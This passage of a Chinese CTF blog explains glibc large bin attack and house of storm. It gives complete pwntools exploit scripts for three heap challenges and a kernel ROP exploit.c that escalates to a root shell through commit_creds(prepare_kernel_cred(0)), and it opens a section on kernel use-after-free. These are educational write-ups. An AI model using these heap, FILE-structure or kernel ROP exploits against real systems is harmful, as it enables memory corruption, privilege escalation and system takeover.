 56.\t                       &#123;  57.\t                         victim-&gt;fd_nextsize = fwd;  58.\t                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;  //fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控  59.\t                         fwd-&gt;bk_nextsize = victim;  60.\t                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //第一次任意地址写入unsorted bin chunk的地址  61.\t                       &#125;  62.\t                     bck = fwd-&gt;bk; //bk也就是large bin的bk位置的数据，因此bck可控  63.\t                   &#125;  64.\t               &#125;  65.\t             else  66.\t               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;  67.\t           &#125;  68.\t  69.\t         mark_bin (av, victim_index);  70.\t         victim-&gt;bk = bck;  71.\t         victim-&gt;fd = fwd;  72.\t         fwd-&gt;bk = victim;  73.\t         bck-&gt;fd = victim; //第二次任意地址写入unsorted bin chunk的地址  74.\t  75.\tdefine MAX_ITERS       10000  76.\t         if (++iters &gt;= MAX_ITERS)  77.\t           break;  78.\t       &#125;  \n\n首先，victim就是unsorted bin chunk，也就在unsorted bin里未归位的large bin chunk。而fwd就是large bin的chunk。从上来看，首先，在unsorted bin里我们得有一个large bin chunk，并且在large bin里，我们也要有一个chunk，但是，我们得**[保证unsorted bin里的那个large bin chunk的size要比large bin里已有的这个chunk的size要大一点，但是都属于同一个index。]{.mark}**\n这样做的目的是我们想绕过前面的这一大块，直接到后面的那个else处。\n\n\n然后，假设我们通过UAF或其他漏洞，控制了large bin里的这个chunk的bk_nextsize为addr1，那么**[victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim; &#x2F;&#x2F;第一次任意地址写入unsorted bin chunk的地址]{.mark}** 也就是addr1-&gt;fd_nextsize &#x3D; victim，也就是*(addr1+0x20) &#x3D; victim，这就是第一次任意地址写一个堆地址；接下来，假如，我们还能控制large bin里那个chunk的bk为addr2，那么首先**[bck &#x3D; fwd-&gt;bk;]{.mark}** 使得bck &#x3D; addr2，接下来**[bck-&gt;fd &#x3D; victim; &#x2F;&#x2F;第二次任意地址写入unsorted bin chunk的地址]{.mark}  *也就是addr2-&gt;fd &#x3D; victim，也就是(addr2+0x10) &#x3D; victim。这样利用large bin attack，我们可以有两次往任意地址写入堆地址的机会。下面，我们就来看一道题。\nstarctf_2019_heap_master首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n初始化\n\n\nadd函数\n\n\ndelete函数\n\n\nedit函数\n\n\n可以看到，这里面的edit，delete操作，都只是针对mmap出来的那片空间，而malloc出来的空间我们控制不了，无法写数据过去。也没有函数用于泄露。由此，我们可以使用large bin attack攻击IO_2_1_stdout结构体，第一次，将IO_2_1_stdout结构体的flags覆盖为堆地址，第二次利用错位将IO_2_1_stdout的_IO_write_base成员低1字节覆盖为0，这样就能泄露数据了。还有一点需要注意的是这个flags有要求\n首先，我们需要绕过这两个if，这就要求低1字节的低4位不能为8，第二字节的低4位必须要为8，也就是，我们的unsorted bin chunk地址末尾地址应该为0x800这样\n\n\n接下来，到达new_do_write，我们要让这个if成立\n\n\n\n\n综上，我们的unsorted bin chunk的地址某位应该是这样的0x1800、0x3800、0x5800…这样的第二字节高4位为奇数即可，由于堆地址随机化，因此第二字节高4位我们不用管，随着堆的随机化总有一次符合要求。我们只需要满足低12bit即可，也就是，**[这个未归位的unsorted bin chunk，我们需要放到偏移0x800处。并且在最后，我们还需要再链入一个小的unsorted bin，]{.mark}**不然我们执行了large bin attack后，在unsorted bin里还没找到符合申请大小的chunk，就会把large bin切割，导致崩溃。\n1.\t#伪造8个chunk  2.\t#0  3.\tedit(0,0x100,p64(0) + p64(0x421) + &#x27;a&#x27;*0xF0)  4.\t#1  5.\tedit(0x420,0x20,p64(0) + p64(0x21) + &#x27;b&#x27;*0x10)  6.\t#2  7.\tedit(0x440,0x20,p64(0) + p64(0x21) + &#x27;b&#x27;*0x10)  8.\t#3  9.\tedit(0x880,0x100,p64(0) + p64(0x431) + &#x27;c&#x27;*0xF0)  10.\t#4  11.\tedit(0xCB0,0x20,p64(0) + p64(0x21) + &#x27;d&#x27;*0x10)  12.\t#5  13.\tedit(0xCD0,0x90,p64(0) + p64(0x91) + &#x27;e&#x27;*0x80)  14.\t#6  15.\tedit(0xD60,0x20,p64(0) + p64(0x21) + &#x27;f&#x27;*0x10)  16.\t#7  17.\tedit(0xD80,0x20,p64(0) + p64(0x21) + &#x27;g&#x27;*0x10)  \n\n如上，0将放入large bin，而3将作为在unsorted bin里未归位的large bin chunk，5将链入unsorted bin作为large bin attack以后的申请用。这样攻击了IO_2_1_stdout以后，我们就得到了glibc地址，然后，我们就可以利用house of orange来getshell了。\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)_IO_2_1_stdout_s = libc.sym[&#x27;_IO_2_1_stdout_&#x27;]def add(size):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size))def edit(offset,size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;offset:&#x27;,str(offset))   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;content:&#x27;,content)def delete(offset):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;offset:&#x27;,str(offset))def exploit():   #伪造8个chunk   #0   edit(0,0x100,p64(0) + p64(0x421) + &#x27;a&#x27;*0xF0)   #1   edit(0x420,0x20,p64(0) + p64(0x21) + &#x27;b&#x27;*0x10)   #2   edit(0x440,0x20,p64(0) + p64(0x21) + &#x27;b&#x27;*0x10)   #3   edit(0x880,0x100,p64(0) + p64(0x431) + &#x27;c&#x27;*0xF0)   #4   edit(0xCB0,0x20,p64(0) + p64(0x21) + &#x27;d&#x27;*0x10)   #5   edit(0xCD0,0x90,p64(0) + p64(0x91) + &#x27;e&#x27;*0x80)   #6   edit(0xD60,0x20,p64(0) + p64(0x21) + &#x27;f&#x27;*0x10)   #7   edit(0xD80,0x20,p64(0) + p64(0x21) + &#x27;g&#x27;*0x10)   #0进入unsored bin   delete(0x10)   #malloc_consolidate将0放入large bin   add(0x430)   #接下来，为了在bk和bk_nextsize处都有libc指针，我们要继续伪造unsorted bin   #在bk_nextsize处留下libc指针   edit(0x10,0xF0,p64(0) + p64(0x91) + &#x27;a&#x27;*0x80 + (p64(0) + p64(0x21) + &#x27;a&#x27;*0x10) * 3)   delete(0x20)   add(0x80) #把unsorted bin申请掉   #在bk留下libc指针   edit(0,0x10,p64(0) + p64(0xC1))   delete(0x10)   add(0xB0) #把unsorted bin申请掉   #修改large bin的bk，指向stdout   edit(0x10,0xA,p64(0) + p16((0x2 &lt;&lt; 12) + ((_IO_2_1_stdout_s - 0x10) &amp; 0xFFF)))   #修改large bin的bk_nextsize   edit(0x20,0xA,p64(0) + p16((0x2 &lt;&lt; 12) + ((_IO_2_1_stdout_s + 0x20 - 0x20 - 0x7) &amp; 0xFFF)))   #恢复large bin的头size   edit(0,0x10,p64(0) + p64(0x421))   #3放入unsorted bin，3属于未归位的large bin   delete(0x890)   #0x90的堆放入unsorted bin   delete(0xCE0)   #遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout   add(0x80)   sh.recv(1)   sh.recv(0x18)   libc_base = u64(sh.recv(8)) - libc.symbols[&#x27;_IO_file_jumps&#x27;]   print &#x27;libc_base=&#x27;,hex(libc_base)   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;leak error&#x27;)   _IO_list_all_addr = libc_base + libc.symbols[&#x27;_IO_list_all&#x27;]   system_addr = libc_base + libc.sym[&#x27;system&#x27;]   binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()   _IO_str_finish_ptr_addr = libc_base + 0x3C37B0   print &#x27;_IO_list_all_addr=&#x27;,hex(_IO_list_all_addr)   print &#x27;_IO_str_finish_ptr_addr=&#x27;,hex(_IO_str_finish_ptr_addr)   print &#x27;system_addr=&#x27;,hex(system_addr)   print &#x27;binsh_addr=&#x27;,hex(binsh_addr)   #house of orange   fake_file = p64(0) + p64(0x61) #unsorted bin attack   fake_file += p64(0) + p64(_IO_list_all_addr - 0x10)   #_IO_write_base &lt; _IO_write_ptr   fake_file += p64(0) + p64(1)   fake_file += p64(0) + p64(binsh_addr)   fake_file = fake_file.ljust(0xC0,&#x27;\\x00&#x27;)   fake_file += p64(0)*3   fake_file += p64(_IO_str_finish_ptr_addr - 0x18) #vtable   fake_file += p64(0)   fake_file += p64(system_addr)   delete(0xCE0) #unsorted bin   edit(0xCD0,len(fake_file),fake_file) #修改unsorted bin内容   #getshell   add(1)while True:   try:      global sh      #sh = process(&#x27;./starctf_2019_heap_master&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,29960)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;\n\nhouse of strom理解了large bin attack，接下来，我们就可以来看house of strom了，house of strom可以实现任意地址分配，看看前面的这道题，我们是将一个合法的unsorted bin chunk链接到unsorted bin里未归位的large bin chunk的bk处，[假设，我们将一个任意地址比如addr链接到unsorted bin里未归位的large bin chunk的bk处，然后执行large bin attack会发生什么。]{.mark}\n那么，在large bin attack阶段不会有问题，只是接下来，继续遍历，取到我们链接上的这个chunk时，检查其size，不符合要求然后崩溃。我们可以利用前面的large bin attack，[先将addr处的size的位置写上一个堆指针，我们可以利用错位法，这样，在size处留下了chunk地址值的第6字节数据，在开启PIE的情况下，一般为0x55为0x56]{.mark}，这样，我们malloc(0x40)，遍历到第一个未归位的large bin chunk时，发生large bin attack，接下来遍历到后面这个任意地址的chunk时，发现size符合要求，直接返回给用户，就可以成功把这个任意地址的空间申请过来。\n\n\n这就是house of strom的原理。\n我们来看两道题\nrctf_2019_babyheap首先，检查一下程序的保护机制\n\n\n沙箱禁用了execve调用，因此我们只能使用open、read、write来读flag\n\n\n然后，我们用IDA分析一下，禁用fastbin，因此不能使用fastbin attack。\n\n\nEdit功能存在null off by one漏洞。\n\n\nAdd功能里size比较自由\n\n\n首先就是利用null off by one构造overlap chunk，然后利用malloc_consolidate将一个chunk放到large bin，另一个放到unsorted bin，然后利用overlap chunk去控制这两个bin的指针。然后malloc(0x48)触发large bin attack的同时将会把任意地址申请过来。\n我们用house of strom申请到free_hook处，劫持free_hook为setcontext+xx处，这样就能将栈切换到堆里，我们提前在堆里布置好rop即可。\n#coding:utf8from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)#sh = process(&#x27;./rctf_2019_babyheap&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28529)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]setcontext_s = libc.sym[&#x27;setcontext&#x27;]open_s = libc.sym[&#x27;open&#x27;]read_s = libc.sym[&#x27;read&#x27;]write_s = libc.sym[&#x27;write&#x27;]def add(size):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))def edit(index,content):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendafter(&#x27;Content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))add(0xF0) #0add(0x38) #1add(0x3F0) #2 large bin chunkadd(0x10) #3add(0xF0) #4add(0x48) #5add(0x3F0) #6 large bin chunkadd(0x100) #7delete(0)#null off by oneedit(1,&#x27;a&#x27;*0x30 + p64(0x40 + 0x100))delete(2)add(0xF0) #0show(1)sh.recv(1)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssetcontext_addr = libc_base + setcontext_swrite_addr = libc_base + write_sopen_addr = libc_base + open_sread_addr = libc_base + read_spop_rdi = libc_base + 0x0000000000021102pop_rsi = libc_base + 0x00000000000202e8pop_rdx = libc_base + 0x0000000000001b92print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;setcontext_addr=&#x27;,hex(setcontext_addr)#将剩余部分申请，现在2与1重合add(0x430) #2#继续用同样的方法，构造一个未归位的large bin，并且比前一个大一些,但是要保证处于同一个index内delete(4)edit(5,&#x27;b&#x27;*0x40 + p64(0x50 + 0x100))delete(6)add(0xF0) #4#将剩余部分申请，5与6重合add(0x440) #6#2放入unsorted bindelete(2)#2放入large binadd(0x500) #2#6放入unsorted bindelete(6)#现在，堆布局是unsorted bin里一个未归位的large bin,large bin里有一个chunk，且unsorted bin里的比large bin里的大#将free_hook_addr链接到unsorted bin chunk的bkfake_chunk = free_hook_addr - 0x10edit(5,p64(0) + p64(fake_chunk))#控制large bin的bk_nextsize，目的是解链时向bk_nextsize-&gt;fd_nextsize写入一个堆地址，我们可以以此来伪造sizepayload = p64(0) + p64(fake_chunk + 0x8) #bk，只需保证是一个可写的地址即可payload += p64(0) + p64(fake_chunk - 0x18 - 0x5)edit(1,payload)##触发house of storm，申请到free_hook处add(0x48) #6#写free_hook，栈迁移到堆里&#x27;&#x27;&#x27;mov     rsp, [rdi+0A0h]...&#x27;&#x27;&#x27;rop = p64(0) + p64(pop_rsi) + p64(free_hook_addr + 0x40) + p64(pop_rdx) + p64(0x200) + p64(read_addr)payload = p64(setcontext_addr + 0x35) + &#x27;\\x00&#x27;*0x8payload += ropedit(6,payload)#设置0xA0偏移处的值edit(7,&#x27;a&#x27;*0xA0 + p64(free_hook_addr + 0x10) + p64(pop_rdi))#栈迁移到free_hook_addr + 0x10，执行read，继续输入后续ropdelete(7)flag_addr = free_hook_addr + 0x40 + 0x98rop2 = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(open_addr)rop2 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)rop2 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(write_addr)rop2 += &#x27;/flag\\x00&#x27;sleep(1)sh.send(rop2)sh.interactive()\n\n0ctf_2018_heapstorm2首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n存在一个null off by one漏洞，但是prev_size不可控。\n\n\n由此，我们可以使用shrink unsorted bin的方法来构造overlap chunk。\nShow功能需要满足条件才能使用\n\n\n因此，我们需要利用house of strom申请到堆指针数组处，也就是0x13370800这个地址处，然后控制其里面的数据，使得我们能够调用show，进而泄露地址，然后通过edit去修改free_hook，从而getshell。\n\n\n#coding:utf8from pwn import *sh = process(&#x27;./0ctf_2018_heapstorm2&#x27;)#sh = remote(&#x27;node3.buuoj.cn&#x27;,26323)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)malloc_hook_s = libc.sym[&#x27;__malloc_hook&#x27;]free_hook_s = libc.sym[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()def add(size):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))def edit(index,size,content):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendafter(&#x27;Content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;Command:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))add(0x18) #0add(0x410) #1add(0x80) #2add(0x18) #3add(0x420) #4add(0x80) #5add(0x10) #6#伪造chunk 1的尾部edit(1,0x400,&#x27;b&#x27;*0x3F0 + p64(0x400) + p64(0x21))#1放入unsorted bindelete(1)#null off by one shrink unsorted binedit(0,0x18-0xC,&#x27;a&#x27;*(0x18-0xC))#从unsorted bin里切割add(0x80) #1add(0x360) #7#1放入unsorted bindelete(1)#2向前合并delete(2)add(0x80) #1 将unsorted bin指针移动到下一个chunk#将0x420的chunk申请出来，待会儿再放入large binadd(0x410) #2#我们用同样的方法来构造一个大一些的large binedit(4,0x400,&#x27;d&#x27;*0x3F0 + p64(0x400) + p64(0x31))#4放入unsorted bindelete(4)#null off by one shrink unsorted binedit(3,0x18-0xC,&#x27;c&#x27;*(0x18-0xC))#从unsorted bin里切割add(0x80) #4add(0x360) #8#4放入unsorted bindelete(4)#5向前合并delete(5)add(0x80) #4#将0x430的chunk申请出来，待会儿再放入unsorted binadd(0x420) #5#将2放入large bin，通过7我们可以large bindelete(2)add(0x500) #2#5放入unsorted bin，通过8，我们可以控制一个未归位的large bindelete(5)#我们要分配到的目的地fake_chunk = 0x0000000013370800 - 0x10#控制unsorted bin相关指针edit(8,0x10,p64(0) + p64(fake_chunk))#控制large bin相关指针edit(7,0x20,p64(0) + p64(fake_chunk + 0x8) + p64(0) + p64(fake_chunk - 0x18 -0x5))add(0x48) #5#通过5，我们可以控制整个堆指针数组了edit(5,0x30,p64(0)*2 + p64(0x13377331) + p64(0) + p64(fake_chunk + 0x40) + p64(0x48))edit(0,0x10,p64(0x00000000133707F3) + p64(0x8))#泄露堆地址show(1)sh.recvuntil(&#x27;Chunk[1]: &#x27;)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)#泄露lib指针edit(0,0x10,p64(heap_addr + 0x10) + p64(0x8))show(1)sh.recvuntil(&#x27;Chunk[1]: &#x27;)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sbinsh_addr = libc_base + binsh_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;binsh_addr=&#x27;,hex(binsh_addr)edit(0,0x10,p64(free_hook_addr) + p64(0x8))#写free_hookedit(1,0x8,p64(system_addr))edit(0,0x10,p64(binsh_addr) + p64(0x8))#getshelldelete(1)sh.interactive()","categories":["CTF"],"tags":["house of orange","IO FILE","large bin attack","house of strom"]},{"title":"linux kernel pwn学习之ROP","url":"/2020/02/29/linux_kernel_pwn_ROP/","content":"Linux kernel rop根glibc下的ROP思路是差不多的，当我们学习掌握了glibc下的ROP，再来看kernel的ROP攻击，就很容易理解了。\n与用户态同样的是，内核有也类似于PIE的机制，加kaslr，在启动系统时的脚本里可以指定开启或关闭kaslr。\nqemu-system-x86_64 \\  -m 256M \\  -kernel ./bzImage \\  -initrd  ./core.cpio \\  -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \\  -s  \\  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\  -nographic  \\ \n\n因此，对于开启了kaslr选项的系统，我们同样需要先泄露地址，然后计算出基址。在linux下，有一个文件，记录着内核各函数的地址，它就是**[&#x2F;proc&#x2F;kallsyms文件]{.mark}**，因此，我们只要读取这个文件，就能计算出需要的函数、gadgets的地址。系统一般会限制普通用户读取这个文件。我们做个试验。\n在普通用户下，cat &#x2F;proc&#x2F;kallsyms，发现地址全部都是0。\n\n\n在root用户下，cat &#x2F;proc&#x2F;kallsyms，能够得到地址。\n\n\n因此，如果没有提供其他方法，有时我们还需要像glibc下那样，泄露地址。\n内核ROP的基本操作\n在内核态下，执行commit_creds(prepare_kernel_cred(0))，使得进程的权限提升为root权限。\n\n回到用户态，开启一个shell，这个shell则拥有root权限\n\n\n寻找gadgets我们仍然可以用ROPgadget工具来寻找gadgets，有些gadgets找不到的话，可以用IDA搜索。如果我们有vmlinux文件，则直接用工具在这里面找，如果我们只有bzImage文件，则需要用extract-vmlinux https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux工具来解压出vmlinux文件，不过这个解压后的vmlinux是去符号的二进制文件，函数名都去掉了。\n我们得到的gadgets地址，如果开启了kaslr，则这个就不是绝对地址，那么就要在程序运行时，通过泄露或其他方法，计算出运行时的地址。\n\n\n调试使用gdb调试，首先是gdb –q vmlinux，这样能够进入gdb，并且加载vmlinux的符号。然后，找到我们需要的ko文件，还需要找到ko文件加载的地址，\n进入系统，输入lsmod，发现地址为0，这是因为在普通用户态下，不能查看这个地址。\n\n\n在本地测试时，我们可以修改启动脚本，使得系统一开始就是root用户，然后我们可以查看模块的地址\n\n\n得到地址后，我们就可以在gdb里输入\n//加载模块符号  add-symbol-file core.ko 0xffffffffc020a000  \n\n在qemu的启动脚本里，要事先开启gdb选项，这样，我们在gdb里使用target remote:xxxx即可连接到系统，进行调试了。\n我们以一道题来加深一下理解。\n强网杯2018 core首先，我们解包core.cpio，修改启动脚本，干掉定时关机的命令，然后，我们看到脚本里有这个操作\n#!/bin/sh  mount -t proc proc /proc  mount -t sysfs sysfs /sys  mount -t devtmpfs none /dev  /sbin/mdev -s  mkdir -p /dev/pts  mount -vt devpts -o gid=4,mode=620 none /dev/pts  chmod 666 /dev/ptmx  cat /proc/kallsyms &gt; /tmp/kallsyms  echo 1 &gt; /proc/sys/kernel/kptr_restrict  ifconfig eth0 up  udhcpc -i eth0  ifconfig eth0 10.0.2.15 netmask 255.255.255.0  route add default gw 10.0.2.2  insmod /core.ko    setsid /bin/cttyhack setuidgid 1000 /bin/sh  echo &#x27;sh end!\\n&#x27;  umount /proc  umount /sys    poweroff -d 0  -f  \n\n我们看到，kallsyms被保存了一份到&#x2F;tmp目录下，而tmp目录下的文件我们普通用户也是可以读取的，于是，这就解决了地址的问题，我们有了地址了，那么就能计算出需要的东西的地址了。\n接下来，我们来分析一下驱动程序，ioctl函数定义了几个交互选项。\n\n\n漏洞点在这里\n\n\n[a1是有符号数，我们只要传负数，即可绕过溢出检测]{.mark}，然后，后面qmemcpy的长度为a1的低2字节。我们可以在a1的低2字节写上长度，然后在a1的其他字节全部设置为0xF，这样，就能绕过检查，也能控制溢出长度了。v4是canary，和glibc下一样，我们需要想办法泄露canary。我们再看看其他函数\n\n\noff是我们能够控制的，于是，我们只要控制好off，就能把v7的值读出来。\n在rop里，我们得到root权限后，就应该返回用户态执行shell，而**[返回用户态用到swapgs和iretq这两条指令，在gadgets里能够找到。Iretq会恢复一系列的用户态寄存器值，因此，在程序一开始，我们就先利用内嵌汇编将几个重要的寄存器值保存到程序的变量里。]{.mark}**Iretq的时候再放到rop里。\n需要的东西都具备了，那么我们就能够编写exploit.c程序来提权了。\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;    size_t raw_vmlinux_base = 0xFFFFFFFF81000000;  /*在/tmp/kallsyms中找函数地址*/  size_t commit_creds = 0xFFFFFFFF8109C8E0;  size_t prepare_kernel_cred = 0xFFFFFFFF8109CCE0;  //swapgs ; popfq ; ret，iretq用来回到用户态  size_t swapgs = 0xffffffff81a012da;  //使用IDA查找iretq，iretq后面不需要ret也可以，因为恢复到用户态，rip同样也会变成用户态的  size_t iretq = 0xFFFFFFFF81050AC2;  size_t pop_rdi = 0xffffffff81000b2f;  //mov rdi, rax ; call rcx，ROP为了方便，我们不使用call，而使用jmp!!，不然需要平衡栈才能继续ROP  //size_t mov_rdi_rax_call_rcx = 0xffffffff815c0db1;  //mov rdi, rax ; jmp rcx  size_t mov_rdi_rax_jmp_rcx = 0xffffffff811ae978;  size_t pop_rcx = 0xffffffff81021e53;      size_t user_cs,user_ss,user_flags,user_sp;    /*保存用户态的寄存器到变量里*/  void saveUserState() &#123;     __asm__(&quot;mov %cs,user_cs;&quot;             &quot;mov %ss,user_ss;&quot;             &quot;mov %rsp,user_sp;&quot;             &quot;pushf;&quot;             &quot;pop user_flags;&quot;             );    puts(&quot;user states have been saved!!&quot;);  &#125;    //初始化gadgets的地址  void init_address() &#123;     FILE *f = fopen(&quot;/tmp/kallsyms&quot;,&quot;r&quot;);     char line[0x100];     char *pos;     if (!f) &#123;        printf(&quot;open symbols file error!!\\n&quot;);        exit(-1);     &#125;     while (!feof(f) &amp;&amp; !ferror(f)) &#123;        fgets(line, sizeof(line), f);        if ((pos = strstr(line,&quot;commit_creds&quot;))) &#123;           size_t commit_creds_addr = strtoull(line,pos-3,16);           size_t vmlinux_base = commit_creds_addr - commit_creds + raw_vmlinux_base;           commit_creds = commit_creds_addr;           prepare_kernel_cred += vmlinux_base - raw_vmlinux_base;           swapgs += vmlinux_base - raw_vmlinux_base;           iretq += vmlinux_base - raw_vmlinux_base;           pop_rdi += vmlinux_base - raw_vmlinux_base;           mov_rdi_rax_jmp_rcx += vmlinux_base - raw_vmlinux_base;           pop_rcx += vmlinux_base - raw_vmlinux_base;           printf(&quot;vmlinux_base=0x%lx\\n&quot;,vmlinux_base);           printf(&quot;commit_creds_addr=0x%lx\\n&quot;,commit_creds_addr);           printf(&quot;prepare_kernel_cred_addr=0x%lx\\n&quot;,prepare_kernel_cred);           printf(&quot;swapgs_addr=0x%lx\\n&quot;,swapgs);           printf(&quot;iretq_addr=0x%lx\\n&quot;,iretq);           printf(&quot;pop_rdi_addr=0x%lx\\n&quot;,pop_rdi);           printf(&quot;mov_rdi_rax_jmp_rcx_addr=0x%lx\\n&quot;,mov_rdi_rax_jmp_rcx);           printf(&quot;pop_rcx_addr=0x%lx\\n&quot;,pop_rcx);           break;        &#125;     &#125;     fclose(f);  &#125;    void rootShell() &#123;     if (getuid() == 0) &#123;        printf(&quot;[+]rooted!!\\n&quot;);        system(&quot;/bin/sh&quot;);     &#125; else &#123;        printf(&quot;[+]root fail!!\\n&quot;);     &#125;  &#125;    int main() &#123;     //保存用户态的寄存器     saveUserState();     //初始化地址     init_address();     int fd = open(&quot;/proc/core&quot;,O_RDWR);     if (fd &lt; 0) &#123;        printf(&quot;open file error!!\\n&quot;);        exit(-1);     &#125;     //设置off = 0x40     ioctl(fd,0x6677889C,0x40);     //泄露canary     size_t ans_buf[8] = &#123;0&#125;;     ioctl(fd,0x6677889B,ans_buf);     size_t canary = ans_buf[0];     printf(&quot;canary=0x%lx\\n&quot;,canary);     size_t rop[0x100];     int i = 8;     //canary     rop[i++] = canary;     //rbp     rop[i++] = 0;     //commit_creds(prepare_kernel_cred(0))     rop[i++] = pop_rdi;     rop[i++] = 0;     rop[i++] = prepare_kernel_cred;     rop[i++] = pop_rcx;     rop[i++] = commit_creds;     rop[i++] = mov_rdi_rax_jmp_rcx;     //返回用户态执行shell     rop[i++] = swapgs;     rop[i++] = 0;     rop[i++] = iretq;     rop[i++] = (size_t)rootShell;     rop[i++] = user_cs;     rop[i++] = user_flags;     rop[i++] = user_sp;     rop[i++] = user_ss;     //将rop写到name里     write(fd,rop,0x100);     //栈溢出，执行ROP     ioctl(fd,0x6677889A,0x100 | 0xFFFFFFFFFFFF0000);     return 0;  &#125;","categories":["CTF"],"tags":["栈溢出","ROP","Linux Kernel"]},{"title":"linux kernel pwn学习之UAF","url":"/2020/02/29/linux_kernel_pwn_UAF/","content":"与用户态下的glibc差不多，都是对已经释放的空间未申请就直接使用，[内核的UAF往往是出现在多线程多进程多文件的情况下。]{.mark}即，假如某个用户程序对用一个内核驱动文件打开了两次，有两个文件描述符，它们都指向了该驱动，又因为是在同一个程序里，所以[当我们释放掉其中一个文件描述符后，还可以使用另一个文件描述符来操控驱动。]{.mark}\n为了加深理解，我们就以一题为例\nciscn2017_babydriver我们用IDA分析一下驱动程序，ioctl函数定义了一个交互命令0x10001，作用是释放之前的堆，申请一个用户指定大小的堆。\n\n\n在单文件的情况下，没有问题，加入我们在程序里，对该驱动程序，打开了两个文件描述符，先利用第一个文件描述符来与驱动交互，申请一个堆。然后关闭第一个文件描述符。在关闭文件描述符时，对应的close函数会被调用\n\n\n该函数释放了堆。然而，[我们仍然可以使用第二个文件描述符来对这个堆进行读写操作。，这就造成了UAF。]{.mark}\nLinux kernel 